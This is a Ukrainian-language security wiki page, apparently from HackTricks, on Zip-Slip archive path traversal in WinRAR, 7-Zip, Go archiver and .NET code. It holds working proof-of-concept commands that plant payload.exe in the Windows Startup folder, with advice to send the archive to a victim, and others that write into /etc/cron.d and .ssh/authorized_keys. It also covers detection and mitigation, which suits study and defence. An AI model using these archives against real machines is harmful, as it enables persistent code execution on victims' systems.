# Обхід шляхів під час розпакування архівів ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Огляд

Багато форматів архівів (ZIP, RAR, TAR, 7-ZIP тощо) дозволяють кожному запису містити власний **внутрішній шлях**. Коли утиліта розпакування без перевірки використовує цей шлях, спеціально сформоване ім'я файлу, що містить `..` або **абсолютний шлях** (наприклад, `C:\Windows\System32\`), буде записане за межами обраного користувачем каталогу.
Цей клас вразливостей широко відомий як *Zip-Slip* або **обхід шляхів під час розпакування архівів**.<sup>[[6]](#references)</sup>

Наслідки можуть варіюватися від перезапису довільних файлів до безпосереднього досягнення **віддаленого виконання коду (RCE)** шляхом розміщення payload у місці **автозапуску**, наприклад у папці *Startup* Windows.

## Первинна причина

1. Зловмисник створює архів, у якому один або більше заголовків файлів містять:
* Відносні послідовності обходу (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Абсолютні шляхи (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Або спеціально сформовані **символічні посилання**, які вказують за межі цільового каталогу (поширено в ZIP/TAR на *nix*).
2. Жертва розпаковує архів за допомогою вразливого інструмента, який довіряє вбудованому шляху (або переходить за символічними посиланнями), замість того щоб санітизувати його або примусово виконувати розпакування всередині обраного каталогу.
3. Файл записується в контрольоване зловмисником місце та виконується/завантажується наступного разу, коли система або користувач активує цей шлях.

### Обхід через `.NET` `Path.Combine` + `ZipArchive`

Поширеною анти-практикою в .NET є об'єднання призначеного каталогу з контрольованим користувачем `ZipArchiveEntry.FullName` і розпакування без нормалізації шляху:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Якщо `entry.FullName` починається з `..\\`, він виконує traversal; якщо це **абсолютний шлях**, ліву складову буде повністю відкинуто, що призведе до **довільного запису файлів** як ідентифікатора розпакування.
- Proof-of-concept archive для запису в сусідній каталог `app`, який відстежує сканер за розкладом:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Поміщення цього ZIP у контрольовану вхідну папку призводить до створення `C:\samples\app\0xdf.txt`, що доводить можливість traversal за межі `C:\samples\queue\` і забезпечує подальші примітиви (наприклад, DLL hijacks).

## Реальний приклад – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR для Windows (включно з CLI `rar` / `unrar`, DLL і portable source) не перевіряв імена файлів під час розпакування.
Шкідливий RAR-архів, що містить такий запис:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
опинився б **за межами** вибраного вихідного каталогу та всередині папки *Startup* користувача. Після входу в систему Windows автоматично виконує все, що там міститься, забезпечуючи *persistent* RCE.<sup>[[5]](#references)</sup>

### Створення PoC-архіву (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Використані параметри:
* `-ep`  – зберігати шляхи до файлів точно як задано (не видаляти початковий `./`).

Передайте `evil.rar` жертві та попросіть її розпакувати архів за допомогою вразливої версії WinRAR.

### Зафіксована експлуатація у wild

ESET повідомила про spear-phishing кампанії RomCom (Storm-0978/UNC2596), у яких як вкладення використовувалися RAR-архіви, що зловживали CVE-2025-8088 для розгортання кастомізованих backdoor та сприяння ransomware-операціям.<sup>[[5]](#references)</sup>

## Новіші випадки (2024–2025)

### Обхід каталогів через symlink у ZIP-файлах 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Вразливість**: записи ZIP, які були **symbolic links**, розіменовувалися під час розпакування, що дозволяло зловмисникам вийти за межі цільового каталогу та перезаписувати довільні шляхи. Взаємодія з боку користувача обмежується *відкриттям/розпакуванням* архіву.<sup>[[1]](#references)</sup>
* **Вразливі версії**: 7-Zip 21.02–24.09 (збірки для Windows і Linux). Виправлено у **25.00** (липень 2025) та новіших версіях.
* **Шлях до впливу**: перезаписати `Start Menu/Programs/Startup` або розташування, з яких запускаються служби → код виконується під час наступного входу в систему або перезапуску служби.
* **Швидкий PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
У виправленій збірці `/etc/cron.d` не буде змінено; symlink буде розпаковано як link всередині `/tmp/target`.

### Zip-Slip у Go mholt/archiver Unarchive() (CVE-2025-3445)
* **Вразливість**: `archiver.Unarchive()` обробляє `../` і symlink-записи ZIP, записуючи дані за межі `outputDir`.<sup>[[2]](#references)</sup>
* **Вразливі версії**: `github.com/mholt/archiver` ≤ 3.5.1 (проєкт наразі deprecated).
* **Виправлення**: перейти на `mholt/archives` ≥ 0.1.0 або реалізувати перевірки canonical path перед записом.
* **Мінімальне відтворення**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Поради щодо виявлення

* **Статична перевірка** – перелічіть записи архіву та позначте будь-які імена, що містять `../`, `..\\`, *абсолютні шляхи* (`/`, `C:`), або записи типу *symlink*, ціль яких розташована за межами каталогу розпакування.
* **Canonicalisation** – переконайтеся, що `realpath(join(dest, name))` усе ще починається з `dest`. В іншому разі відхиліть запис.<sup>[[3]](#references)</sup>
* **Розпакування у sandbox** – розпаковуйте дані у тимчасовий каталог, який можна видалити, використовуючи *безпечний* extractor (наприклад, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00), і перевіряйте, що результівні шляхи залишаються всередині каталогу.
* **Моніторинг endpoint** – створюйте alert у разі появи нових executable-файлів, записаних у розташування `Startup`/`Run`/`cron` невдовзі після відкриття архіву через WinRAR/7-Zip тощо.

## Mitigation і Hardening

1. **Оновіть extractor** – WinRAR 7.13+ і 7-Zip 25.00+ реалізують sanitisation шляхів/symlink. Обидва інструменти все ще не мають auto-update.
2. За можливості розпаковуйте архіви з параметром “**Do not extract paths**” / “**Ignore paths**”.
3. У Unix знижуйте привілеї та монтуйте **chroot/namespace** перед розпакуванням; у Windows використовуйте **AppContainer** або sandbox.
4. Якщо ви пишете власний код, нормалізуйте шляхи за допомогою `realpath()`/`PathCanonicalize()` **до** створення/запису та відхиляйте будь-який запис, що виходить за межі цільового каталогу.

## Додаткові / історичні випадки

* 2018 – масштабне повідомлення про *Zip-Slip* від Snyk, що стосувалося багатьох бібліотек Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011: аналогічний обхід каталогів під час злиття `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377): обхід каталогів під час TAR-розпакування slug (виправлено у v1.2).<sup>[[7]](#references)</sup>
* Будь-яка кастомна логіка розпакування, яка не викликає `PathCanonicalize` / `realpath` перед записом.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
